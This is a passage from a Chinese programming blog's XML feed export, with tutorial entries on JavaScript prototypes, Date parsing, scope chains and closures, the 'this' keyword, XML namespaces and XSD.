<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function func()&#123;var a=1;return &#x27;adf&#x27;;&#125;;</span><br><span class="line">alert(typeof func);//function</span><br><span class="line">alert(func instanceof Function);//true</span><br><span class="line">alert(func.__proto__.__proto__.__proto__);//null</span><br><span class="line">alert(func.__proto__);//function()&#123;&#125;</span><br><span class="line">alert(typeof func.__proto__);//function</span><br><span class="line">alert(func.__proto__ instanceof Function);//false</span><br><span class="line">alert(func.__proto__.__proto__);//[object Object]</span><br></pre></td></tr></table></figure>

<p>函数的__proto__属性很奇怪，是function类型但不是Function实例。</p>
<p>调用对象上的一个方法，由于方法在JavaScript对象中是对另一个函数对象的引用，因此解释器会在对象中查找该属性，如果没有找到，则在其内部对象__proto__属性上搜索，由于__proto__属性与对象本身的结构是一样的，因此这个过程会一直回溯到发现该属性，则调用该属性，否则，报告一个错误。</p>
<h2 id="对象的原型是怎么来的"><a href="#对象的原型是怎么来的" class="headerlink" title="对象的原型是怎么来的"></a>对象的原型是怎么来的</h2><p>__proto__属性是在new操作中产生的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var p = new ClassA ();</span><br></pre></td></tr></table></figure>

<p>以上创建对象过程可以用以下过程模拟：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var p = &#123;&#125;;</span><br><span class="line">ClassA.apply(p);</span><br><span class="line">p.__proto__= ClassA.prototype;</span><br></pre></td></tr></table></figure>

<p>也就是说对象的原型是其构造函数的prototype属性。这样就很好理解用原型实现继承的过程了。</p>
<p>构造函数的prototype是用其创建的对象的原型。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript中用字符创建Date时间对象</title>
    <url>/blog/plang/javascript/newdate/</url>
    <content><![CDATA[<p>javascript中没有JAVA中的格式化字符串对象生成时间对象的方法，这里自己写一个晒一晒。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 创建时间对象</span><br><span class="line"> * 格式：</span><br><span class="line"> * 2012-1-1 年月日型</span><br><span class="line"> * 2012-2-3 18:23:34 年月日时分秒型</span><br><span class="line"> * @param dtStr</span><br><span class="line"> * @returns &#123;Date&#125;</span><br><span class="line"> */</span><br><span class="line">function newDate(dtStr)&#123;</span><br><span class="line">    var sp=/[- :]/;</span><br><span class="line">    var dtArr = dtStr.split(sp);</span><br><span class="line">    if(dtArr.length&gt;3)</span><br><span class="line">        return new Date(</span><br><span class="line">                parseInt(dtArr[0],10), //年</span><br><span class="line">                parseInt(dtArr[1],10) - 1,//月</span><br><span class="line">                parseInt(dtArr[2],10),//日</span><br><span class="line">                parseInt(dtArr[3],10),//时</span><br><span class="line">                parseInt(dtArr[4],10),//分</span><br><span class="line">                parseInt(dtArr[5],10)//秒</span><br><span class="line">                );</span><br><span class="line">    else</span><br><span class="line">        return new Date(</span><br><span class="line">                parseInt(dtArr[0],10), //年</span><br><span class="line">                parseInt(dtArr[1],10) - 1,//月</span><br><span class="line">                parseInt(dtArr[2],10)//日</span><br><span class="line">                );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Date对象的方法列表</p>
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Date()</td>
<td>返回当日的日期和时间。</td>
</tr>
<tr>
<td>getDate()</td>
<td>从 Date 对象返回一个月中的某一天 (1 ~ 31)。</td>
</tr>
<tr>
<td>getDay()</td>
<td>从 Date 对象返回一周中的某一天 (0 ~ 6)。</td>
</tr>
<tr>
<td>getMonth()</td>
<td>从 Date 对象返回月份 (0 ~ 11)。</td>
</tr>
<tr>
<td>getFullYear()</td>
<td>从 Date 对象以四位数字返回年份。</td>
</tr>
<tr>
<td>getYear()</td>
<td>请使用 getFullYear() 方法代替。</td>
</tr>
<tr>
<td>getHours()</td>
<td>返回 Date 对象的小时 (0 ~ 23)。</td>
</tr>
<tr>
<td>getMinutes()</td>
<td>返回 Date 对象的分钟 (0 ~ 59)。</td>
</tr>
<tr>
<td>getSeconds()</td>
<td>返回 Date 对象的秒数 (0 ~ 59)。</td>
</tr>
<tr>
<td>getMilliseconds()</td>
<td>返回 Date 对象的毫秒(0 ~ 999)。</td>
</tr>
<tr>
<td>getTime()</td>
<td>返回 1970 年 1 月 1 日至今的毫秒数。</td>
</tr>
<tr>
<td>getTimezoneOffset()</td>
<td>返回本地时间与格林威治标准时间 (GMT) 的分钟差。</td>
</tr>
<tr>
<td>getUTCDate()</td>
<td>根据世界时从 Date 对象返回月中的一天 (1 ~ 31)。</td>
</tr>
<tr>
<td>getUTCDay()</td>
<td>根据世界时从 Date 对象返回周中的一天 (0 ~ 6)。</td>
</tr>
<tr>
<td>getUTCMonth()</td>
<td>根据世界时从 Date 对象返回月份 (0 ~ 11)。</td>
</tr>
<tr>
<td>getUTCFullYear()</td>
<td>根据世界时从 Date 对象返回四位数的年份。</td>
</tr>
<tr>
<td>getUTCHours()</td>
<td>根据世界时返回 Date 对象的小时 (0 ~ 23)。</td>
</tr>
<tr>
<td>getUTCMinutes()</td>
<td>根据世界时返回 Date 对象的分钟 (0 ~ 59)。</td>
</tr>
<tr>
<td>getUTCSeconds()</td>
<td>根据世界时返回 Date 对象的秒钟 (0 ~ 59)。</td>
</tr>
<tr>
<td>getUTCMilliseconds()</td>
<td>根据世界时返回 Date 对象的毫秒(0 ~ 999)。</td>
</tr>
<tr>
<td>parse()</td>
<td>返回1970年1月1日午夜到指定日期（字符串）的毫秒数。</td>
</tr>
<tr>
<td>setDate()</td>
<td>设置 Date 对象中月的某一天 (1 ~ 31)。</td>
</tr>
<tr>
<td>setMonth()</td>
<td>设置 Date 对象中月份 (0 ~ 11)。</td>
</tr>
<tr>
<td>setFullYear()</td>
<td>设置 Date 对象中的年份（四位数字）。</td>
</tr>
<tr>
<td>setYear()</td>
<td>请使用 setFullYear() 方法代替。</td>
</tr>
<tr>
<td>setHours()</td>
<td>设置 Date 对象中的小时 (0 ~ 23)。</td>
</tr>
<tr>
<td>setMinutes()</td>
<td>设置 Date 对象中的分钟 (0 ~ 59)。</td>
</tr>
<tr>
<td>setSeconds()</td>
<td>设置 Date 对象中的秒钟 (0 ~ 59)。</td>
</tr>
<tr>
<td>setMilliseconds()</td>
<td>设置 Date 对象中的毫秒 (0 ~ 999)。</td>
</tr>
<tr>
<td>setTime()</td>
<td>以毫秒设置 Date 对象。</td>
</tr>
<tr>
<td>setUTCDate()</td>
<td>根据世界时设置 Date 对象中月份的一天 (1 ~ 31)。</td>
</tr>
<tr>
<td>setUTCMonth()</td>
<td>根据世界时设置 Date 对象中的月份 (0 ~ 11)。</td>
</tr>
<tr>
<td>setUTCFullYear()</td>
<td>根据世界时设置 Date 对象中的年份（四位数字）。</td>
</tr>
<tr>
<td>setUTCHours()</td>
<td>根据世界时设置 Date 对象中的小时 (0 ~ 23)。</td>
</tr>
<tr>
<td>setUTCMinutes()</td>
<td>根据世界时设置 Date 对象中的分钟 (0 ~ 59)。</td>
</tr>
<tr>
<td>setUTCSeconds()</td>
<td>根据世界时设置 Date 对象中的秒钟 (0 ~ 59)。</td>
</tr>
<tr>
<td>setUTCMilliseconds()</td>
<td>根据世界时设置 Date 对象中的毫秒 (0 ~ 999)。</td>
</tr>
<tr>
<td>toSource()</td>
<td>返回该对象的源代码。</td>
</tr>
<tr>
<td>toString()</td>
<td>把 Date 对象转换为字符串。</td>
</tr>
<tr>
<td>toTimeString()</td>
<td>把 Date 对象的时间部分转换为字符串。</td>
</tr>
<tr>
<td>toDateString()</td>
<td>把 Date 对象的日期部分转换为字符串。</td>
</tr>
<tr>
<td>toGMTString()</td>
<td>请使用 toUTCString() 方法代替。</td>
</tr>
<tr>
<td>toUTCString()</td>
<td>根据世界时，把 Date 对象转换为字符串。</td>
</tr>
<tr>
<td>toLocaleString()</td>
<td>根据本地时间格式，把 Date 对象转换为字符串。</td>
</tr>
<tr>
<td>toLocaleTimeString()</td>
<td>根据本地时间格式，把 Date 对象的时间部分转换为字符串。</td>
</tr>
<tr>
<td>toLocaleDateString()</td>
<td>根据本地时间格式，把 Date 对象的日期部分转换为字符串。</td>
</tr>
<tr>
<td>UTC()</td>
<td>根据世界时返回 1970 年 1 月 1 日 到指定日期的毫秒数。</td>
</tr>
<tr>
<td>valueOf()</td>
<td>返回 Date 对象的原始值。</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>javascript作用域链和闭包</title>
    <url>/blog/plang/javascript/scope/</url>
    <content><![CDATA[<h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>作用域就是变量与函数的可访问范围。在javascript中分为全局作用域和局部作用域。</p>
<p>全局作用域：在代码中任何地方都能访问到的对象拥有全局作用域。在Web浏览器中，他指的就是window对象，该环境直到应用程序退出才被摧毁。</p>
<p>局部作用局：和全局作用域相反，局部作用域一般只在固定的代码片段内可访问到（最常见的例如函数内部），该环境中的代码被执行完毕后，该环境被摧毁。</p>
<h2 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h2><p>函数对象有一个内部属性是[[Scope]]，该内部属性包含了函数被创建的作用域中对象的集合，这个集合被称为函数的作用域链（Scope<br>chain）。</p>
<p>当一个函数创建后，它的作用域链会被创建此函数的作用域中可访问的数据对象所填充。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function add (num1,num2)&#123;</span><br><span class="line">     var sum = num1 + num2;</span><br><span class="line">     return sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当函数add()创建后，它的作用域链中填入了一个单独的对象，这个对象表示所有范围定义的变量。该全局对象包括诸如window,navigator和document等等。如图说明了他们的关系：</p>
<p><img src="/images/js/js-scope.gif"></p>
<p>函数add的作用域会在被执行时用到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var total = add (5,10);</span><br></pre></td></tr></table></figure>
<p>执行这个函数时会创建一个称为”运行期上下文(execution<br>context)”的内部对象。一个运行期上下文定义了一个函数值执行时的环境，他是独一无二的，当函数运行完毕，它就会被摧毁。</p>
<p>如果对运行期上下文这个对象还是不明白看下面这个图：</p>
<p><img src="/images/js/js-scope-link.gif"></p>
<p>下面说下图中运行的过程：（对应图中的1，2，3）</p>
<p>1.当运行期被创建时，它的作用域链初始化为当前运行函数的[[Scope]]属性中所包含的对象。</p>
<p>2.这些值按照他们出现在函数中的顺序，被复制到作用域链中。</p>
<p>3.上面2过程一旦完成，一个被称为”活动对象”的新对象就会被创建，他被推入到作用域链的前端。</p>
<p>4. 当1（运行期上下文）被摧毁，3（活动对象）也随之被摧毁。</p>
<h2 id="作用域链例子"><a href="#作用域链例子" class="headerlink" title="作用域链例子"></a>作用域链例子</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var num = 1;</span><br><span class="line">function total()&#123;</span><br><span class="line">    alert(num);</span><br><span class="line">    var num = 2;</span><br><span class="line">&#125;</span><br><span class="line">var num = 10;</span><br><span class="line">total();</span><br></pre></td></tr></table></figure>

<p>最终结果是undefined，因为局部作用域中有num变量，但在调用后定义，所以调用时就undefined了。</p>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>用简单的语句来描述JavaScript中的闭包的概念：由于JavaScript中，函数是对象，对象是属性的集合，而属性的值又可以是对象，则在函数内定义函数成为理所当然，如果在函数func内部声明函数inner，然后在函数外部调用inner，这个过程即产生了一个闭包。<br>闭包的效果可以简单描述为“使函数外部可以读取函数内部的局部变量”。</p>
<p>闭包的一切效果都基于外部调用inner函数会导致func的上下文不会被摧毁。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function f1()&#123;</span><br><span class="line">    var n=999;</span><br><span class="line">    nAdd=function()&#123;</span><br><span class="line">        n+=1</span><br><span class="line">    &#125;</span><br><span class="line">    function f2()&#123;</span><br><span class="line">　　　　　　 alert(n);</span><br><span class="line">　　　　 &#125;</span><br><span class="line">    return f2;</span><br><span class="line">  　 &#125;</span><br><span class="line">var result=f1();</span><br><span class="line">result();  // 999   输出这个f2的返回值</span><br><span class="line">nAdd();  //调用nAdd函数</span><br><span class="line">result();  // 1000</span><br></pre></td></tr></table></figure>

<p>因为f2的上下文依赖于f1的上下文所以在f1运行完后其上下文不会被摧毁，其中的值一直都存在着。</p>
<p><img src="/images/js/js-bibao.gif"></p>
<h2 id="闭包的用途"><a href="#闭包的用途" class="headerlink" title="闭包的用途"></a>闭包的用途</h2><h3 id="对象的封闭"><a href="#对象的封闭" class="headerlink" title="对象的封闭"></a>对象的封闭</h3><p>封装的效果为未经授权的客户代码无法访问到我们不公开的数据。看这个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Person(name) &#123;</span><br><span class="line">    // private variable</span><br><span class="line">    var address = &quot;The Earth&quot;;</span><br><span class="line">    // public method</span><br><span class="line">    this.getAddress = function() &#123;</span><br><span class="line">        return address;</span><br><span class="line">    &#125;</span><br><span class="line">    // public variable</span><br><span class="line">    this.name = name;</span><br><span class="line">&#125;</span><br><span class="line">// public</span><br><span class="line">Person.prototype.getName = function() &#123;</span><br><span class="line">    return this.name;</span><br><span class="line">&#125;</span><br><span class="line">// public</span><br><span class="line">Person.prototype.setName = function(name) &#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>?</p>
<p>每一次new<br>Person()时都会创建一个上下文，其中局部变量address就在其中。新创建的对象中会有一个方法getAddress()可以调用上下文中的address，这就形成闭包，使上下文的生命周期和创建的对象一样。每一个Person都会关联一个上下文，这样就可以实现属性的封闭了。</p>
<h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p>设想我们有一个处理过程很耗时的函数对象，每次调用都会花费很长时间，那么我们就需要将计算出来的值存储起来，当调用这个函数的时候，首先在缓存中查找，如果找不到，则进行计算，然后更新缓存并返回值，如果找到了，直接返回查找到的值即可。闭包正是可以做到这一点，因为它不会释放外部的引用，从而函数内部的值可以得以保留。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var CachedSearchBox = (function() &#123;</span><br><span class="line">    var cache = &#123;&#125;, count = [];</span><br><span class="line">    return &#123;</span><br><span class="line">        attachSearchBox : function(dsid) &#123;</span><br><span class="line">            if (dsid in cache) &#123;// 如果结果在缓存中</span><br><span class="line">                return cache[dsid];// 直接返回缓存中的对象</span><br><span class="line">            &#125;</span><br><span class="line">            var fsb = new uikit.webctrl.SearchBox(dsid);// 新建</span><br><span class="line">            cache[dsid] = fsb;// 更新缓存</span><br><span class="line">            if (count.length &gt; 100) &#123;// 保正缓存的大小&lt;=100</span><br><span class="line">                delete cache[count.shift()];</span><br><span class="line">            &#125;</span><br><span class="line">            return fsb;</span><br><span class="line">        &#125;,</span><br><span class="line">        clearSearchBox : function(dsid) &#123;</span><br><span class="line">            if (dsid in cache) &#123;</span><br><span class="line">                cache[dsid].clearSelection();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line">CachedSearchBox.attachSearchBox(&quot;input1&quot;);</span><br></pre></td></tr></table></figure>

<p>这样，当我们第二次调用CachedSearchBox.attachSerachBox(“input1”)的时候，我们就可以从缓存中取道该对象，而不用再去创建一个新的searchbox对象。</p>
<h3 id="柯里化"><a href="#柯里化" class="headerlink" title="柯里化"></a>柯里化</h3><p>柯里化就是预先将函数的某些参数传入，得到一个简单的函数，但是预先传入的参数被保存在闭包中，因此会有一些奇特的特性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var adder = function(num)&#123;</span><br><span class="line">    return function(y)&#123;</span><br><span class="line">        return num + y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var inc = adder(1);</span><br><span class="line">var dec = adder(-1);</span><br></pre></td></tr></table></figure>

<p>这里的inc&#x2F;dec两个变量事实上是两个新的函数，可以通过括号来调用，比如下例中的用法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//inc, dec现在是两个新的函数，作用是将传入的参数值(+/-)1</span><br><span class="line">alert(inc(99));//100</span><br><span class="line">alert (dec(101));//100</span><br><span class="line">alert (adder(100)(2));//102</span><br><span class="line">alert (adder(2)(100));//102</span><br></pre></td></tr></table></figure>

<p>柯里化可以创建有状态的函数，函数的状态保存在其关联的上下文中。再看一个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//update会返回一个函数，这个函数可以设置id属性为item的web元素的内容</span><br><span class="line">function update(item) &#123;</span><br><span class="line">    return function(text) &#123;</span><br><span class="line">        $(&quot;div#&quot; + item).html(text);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">// Ajax请求，当成功是调用参数callback</span><br><span class="line">function refresh(url, callback) &#123;</span><br><span class="line">    var params = &#123;</span><br><span class="line">        type : &quot;echo&quot;,</span><br><span class="line">        data : &quot;&quot;</span><br><span class="line">    &#125;;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type : &quot;post&quot;,</span><br><span class="line">        url : url,</span><br><span class="line">        cache : false,</span><br><span class="line">        async : true,</span><br><span class="line">        dataType : &quot;json&quot;,</span><br><span class="line">        data : params,</span><br><span class="line">        // 当异步请求成功时调用</span><br><span class="line">        success : function(data, status) &#123;</span><br><span class="line">            callback(data);</span><br><span class="line">        &#125;,</span><br><span class="line">        // 当请求出现错误时调用</span><br><span class="line">        error : function(err) &#123;</span><br><span class="line">            alert(&quot;error : &quot; + err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">refresh(&quot;action.do?target=news&quot;, update(&quot;newsPanel&quot;));</span><br><span class="line">refresh(&quot;action.do?target=articles&quot;, update(&quot;articlePanel&quot;));</span><br><span class="line">refresh(&quot;action.do?target=pictures&quot;, update(&quot;picturePanel&quot;));</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript面向对象设计-深入this关键字</title>
    <url>/blog/plang/javascript/this/</url>
    <content><![CDATA[<p>函数中的this默认代表调用函数的对象，为什么说默认呢，因为可以通过call和apply设置this。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function func()&#123;</span><br><span class="line">    alert(this.toString());</span><br><span class="line">&#125;</span><br><span class="line">func();//[object Window]</span><br><span class="line">var obj=new function()&#123;&#125;;</span><br><span class="line">obj.f=func;</span><br><span class="line">obj.f();//[object Object]</span><br></pre></td></tr></table></figure>

<p>输出的是什么意思？object说明this是一个对象，Window指出this的类型是什么。</p>
<p>在浏览器中Window类型有一个可用实例window，window对象是浏览器javascript引擎的顶层对象。任何函数调用都是类似于obj.func()形式的，只不过当obj为顶层对象时可以不用写。所以所有全局的函数和变量都是这个对象的属性。</p>
<p>测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var testVar=’ testVar通过window调用’;</span><br><span class="line">function testWindow()&#123;</span><br><span class="line">     alert(‘testWindow通过window调用’);</span><br><span class="line">&#125;</span><br><span class="line">window. testWindow ();//testWindow通过window调用</span><br><span class="line">alert(window. testVar);// testVar通过window调用</span><br></pre></td></tr></table></figure>

<p>调用是成功的。</p>
<p>所以,我们定义了一个全局的变量或函数的时候，以下三种方式是相同的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var test=&quot;Tony&quot;;</span><br><span class="line">function f1()&#123;&#125;</span><br><span class="line">//--------------------</span><br><span class="line">window.test=&quot;Tony&quot;</span><br><span class="line">window.f1= function ()&#123;&#125;;</span><br><span class="line">//------------------------------</span><br><span class="line">window[&quot;test&quot;]=&quot;Tony&quot;;</span><br><span class="line">window[&quot;f1&quot;]= function ()&#123;&#125;;</span><br></pre></td></tr></table></figure>

<p>因此，func()调用者是window，输出[object Window]；obj.f()调用者是obj，输出[object Object]。正是应了”函数中的this默认代表调用函数的对象”。</p>
<p>为什么不用var声明的变量为全局变量，因为有个隐藏前缀window对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">obj=&#123;</span><br><span class="line">    func:function()&#123;</span><br><span class="line">       v1=&#x27;in func no var&#x27;;</span><br><span class="line">       var v2=&#x27;in func with var&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.func();</span><br><span class="line">alert(obj.v1);//undefined</span><br><span class="line">alert(window.v1);//in func no var</span><br><span class="line">alert(obj.v2);//undefined</span><br></pre></td></tr></table></figure>

<p>在对象obj的func函数中声明的变量v1因为没有添加var变成了全局变量了。</p>
<p>为了更好的理解”函数中的this默认代表调用函数的对象”，我们看一个闭包的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var name = &quot;The Window&quot;;</span><br><span class="line">var object = &#123;</span><br><span class="line">    name : &quot;My Object&quot;,</span><br><span class="line">    doSomething : function() &#123;</span><br><span class="line">        return function() &#123;</span><br><span class="line">            return this.name;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">alert(object.doSomething()());//The Window</span><br></pre></td></tr></table></figure>

<p>为什么会是The Window？object.doSomething()()可以等同于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var func= object.doSomething();</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>

<p>可以看到返回的函数会被widow对象调用，自然其中的this也是window对象了。this.name也就成了window.name了。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>XML之命名空间（XML Namespaces）</title>
    <url>/blog/plang/xml/xmlns/</url>
    <content><![CDATA[<h4 id="命名冲突"><a href="#命名冲突" class="headerlink" title="命名冲突"></a>命名冲突</h4><p>在 XML中，元素名称是由开发者定义的，当两个不同的文档使用相同的元素名时，就会发生命名冲突。</p>
<p>这个 XML 文档携带着某个表格中的信息：</p>
<pre><code>&lt;table&gt;
   &lt;tbody&gt;&lt;tr&gt;
   &lt;td&gt;Apples&lt;/td&gt;
   &lt;td&gt;Bananas&lt;/td&gt;
   &lt;/tr&gt;
   &lt;/tbody&gt;
&lt;/table&gt;
   
</code></pre>
<p>这个 XML 文档携带有关桌子的信息（一件家具）：</p>
<pre><code>&lt;table&gt;
   &lt;name&gt;African Coffee Table&lt;/name&gt;
   &lt;width&gt;80&lt;/width&gt;
   &lt;length&gt;120&lt;/length&gt;
&lt;/table&gt;
</code></pre>
<p>假如这两个 XML 文档被一起使用，由于两个文档都包含带有不同内容和定义的&lt;table&gt; 元素，就会发生命名冲突。</p>
<p>XML 解析器无法确定如何处理这类冲突。</p>
<h4 id="XML-解析器无法确定如何处理这类冲突。"><a href="#XML-解析器无法确定如何处理这类冲突。" class="headerlink" title="XML 解析器无法确定如何处理这类冲突。"></a>XML 解析器无法确定如何处理这类冲突。</h4><p>此文档带有某个表格中的信息：</p>
<pre><code>&lt;f:table&gt;
   &lt;f:name&gt;African Coffee Table&lt;/f:name&gt;
   &lt;f:width&gt;80&lt;/f:width&gt;
   &lt;f:length&gt;120&lt;/f:length&gt;
&lt;/f:table&gt;
</code></pre>
<p>此 XML 文档携带着有关一件家具的信息：</p>
<pre><code>&lt;f:table&gt;
   &lt;f:name&gt;African Coffee Table&lt;/f:name&gt;
   &lt;f:width&gt;80&lt;/f:width&gt;
   &lt;f:length&gt;120&lt;/f:length&gt;
&lt;/f:table&gt;
</code></pre>
<p>现在，命名冲突不存在了，这是由于两个文档都使用了不同的名称来命名它们的&lt;table&gt; 元素 (&lt;h:table&gt; 和 &lt;f:table&gt;)。</p>
<p>通过使用前缀，我们创建了两种不同类型的 &lt;table&gt; 元素。</p>
<h4 id="使用命名空间（Namespaces）"><a href="#使用命名空间（Namespaces）" class="headerlink" title="使用命名空间（Namespaces）"></a>使用命名空间（Namespaces）</h4><p>这个 XML 文档携带着某个表格中的信息：</p>
<pre><code>&lt;h:table xmlns:h=&quot;http://www.w3.org/TR/html4/&quot;&gt;
   &lt;h:tr&gt;
   &lt;h:td&gt;Apples&lt;/h:td&gt;
   &lt;h:td&gt;Bananas&lt;/h:td&gt;
   &lt;/h:tr&gt;
&lt;/h:table&gt;
</code></pre>
<p>此 XML 文档携带着有关一件家具的信息：</p>
<pre><code>&lt;f:table xmlns:f=&quot;http://www.w3school.com.cn/furniture&quot;&gt;
   &lt;f:name&gt;African Coffee Table&lt;/f:name&gt;
   &lt;f:width&gt;80&lt;/f:width&gt;
   &lt;f:length&gt;120&lt;/f:length&gt;
&lt;/f:table&gt;
</code></pre>
<p>与仅仅使用前缀不同，我们为 &lt; table&gt; 标签添加了一个 xmlns属性，这样就为前缀赋予了一个与某个命名空间相关联的限定名称。</p>
<h4 id="XML-Namespace-xmlns-属性"><a href="#XML-Namespace-xmlns-属性" class="headerlink" title="XML Namespace (xmlns) 属性"></a>XML Namespace (xmlns) 属性</h4><p>XML 命名空间属性被放置于元素的开始标签之中，并使用以下的语法：</p>
<pre><code>xmlns:namespace-prefix=&quot;namespaceURI&quot;
</code></pre>
<p>当命名空间被定义在元素的开始标签中时，所有带有相同前缀的子元素都会与同一个命名空间相关联。</p>
<p>注释：用于标示命名空间的地址不会被解析器用于查找信息。其惟一的作用是赋予命名空间一个惟一的名称。不过，很多公司常常会作为指针来使用命名空间指向实际存在的网页，这个网页包含关于命名空间的信息。</p>
<h4 id="默认的命名空间（Default-Namespaces）"><a href="#默认的命名空间（Default-Namespaces）" class="headerlink" title="默认的命名空间（Default Namespaces）"></a>默认的命名空间（Default Namespaces）</h4><p>为元素定义默认的命名空间可以让我们省去在所有的子元素中使用前缀的工作。</p>
<p>请使用下面的语法：</p>
<pre><code>xmlns=&quot;namespaceURI&quot;
</code></pre>
<p>这个 XML 文档携带着某个表格中的信息：</p>
<pre><code>&lt;table xmlns=&quot;http://www.w3.org/TR/html4/&quot;&gt;
   &lt;tbody&gt;&lt;tr&gt;
   &lt;td&gt;Apples&lt;/td&gt;
   &lt;td&gt;Bananas&lt;/td&gt;
   &lt;/tr&gt;
   &lt;/tbody&gt;
&lt;/table&gt;       
</code></pre>
<p>此 XML 文档携带着有关一件家具的信息：</p>
<pre><code>&lt;table xmlns=&quot;http://www.w3school.com.cn/furniture&quot;&gt;
   &lt;name&gt;African Coffee Table&lt;/name&gt;
   &lt;width&gt;80&lt;/width&gt;
   &lt;length&gt;120&lt;/length&gt;
&lt;/table&gt;
   
   
   
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title>XML之XSD（XML Schema Definition）简介</title>
    <url>/blog/plang/xml/xsdjj/</url>
    <content><![CDATA[<h3 id="XSD"><a href="#XSD" class="headerlink" title="XSD"></a>XSD</h3><p>XML Schema 是基于 XML 的 DTD 替代者。</p>
<p>XML Schema 可描述 XML 文档的结构。</p>
<p>XML Schema 语言也可作为 XSD（XML Schema Definition）来引用。</p>
<p>XML Schema 的作用是定义 XML 文档的合法构建模块，类似 DTD。</p>
<ul>
<li>定义可出现在文档中的元素</li>
<li>定义可出现在文档中的属性</li>
<li>定义哪个元素是子元素</li>
<li>定义子元素的次序</li>
<li>定义子元素的数目</li>
<li>定义元素是否为空，或者是否可包含文本</li>
<li>定义元素和属性的数据类型</li>
<li>定义元素和属性的默认值以及固定值</li>
</ul>
<h3 id="为什么用XSD"><a href="#为什么用XSD" class="headerlink" title="为什么用XSD"></a>为什么用XSD</h3><p>XML Schema 最重要的能力之一就是对数据类型的支持。</p>
<p>通过对数据类型的支持：</p>
<ul>
<li>可更容易地描述允许的文档内容</li>
<li>可更容易地验证数据的正确性</li>
<li>可更容易地与来自数据库的数据一并工作</li>
<li>可更容易地定义数据约束（data facets）</li>
<li>可更容易地定义数据模型（或称数据格式）</li>
<li>可更容易地在不同的数据类型间转换数据</li>
</ul>
<h4 id="XML-Schema-使用-XML-语法"><a href="#XML-Schema-使用-XML-语法" class="headerlink" title="XML Schema 使用 XML 语法"></a>XML Schema 使用 XML 语法</h4><p>另一个关于 XML Schema 的重要特性是，它们由 XML 编写。</p>
<p>由 XML 编写 XML Schema 有很多好处：</p>
<ul>
<li>不必学习新的语言</li>
<li>可使用 XML 编辑器来编辑 Schema 文件</li>
<li>可使用 XML 解析器来解析 Schema 文件</li>
<li>可通过 XML DOM 来处理 Schema</li>
<li>可通过 XSLT 来转换 Schema</li>
</ul>
<h4 id="XML-Schema-可保护数据通信"><a href="#XML-Schema-可保护数据通信" class="headerlink" title="XML Schema 可保护数据通信"></a>XML Schema 可保护数据通信</h4><p>当数据从发送方被发送到接受方时，其要点是双方应有关于内容的相同的“期望值”。</p>
<p>通过 XML Schema，发送方可以用一种接受方能够明白的方式来描述数据。</p>
<p>一种数据，比如”03-11-2004”，在某些国家被解释为11月3日，而在另一些国家为当作3月11日。</p>
<p>但是一个带有数据类型的 XML元素，比如：2004-03-11，可确保对内容一致的理解，这是因为 XML 的数据类型”date” 要求的格式是 “YYYY-MM-DD”。</p>
<h4 id="XML-Schema-可扩展"><a href="#XML-Schema-可扩展" class="headerlink" title="XML Schema 可扩展"></a>XML Schema 可扩展</h4><p>XML Schema 是可扩展的，因为它们由 XML 编写。</p>
<p>通过可扩展的 Schema 定义，您可以：</p>
<ul>
<li>在其他 Schema 中重复使用您的 Schema</li>
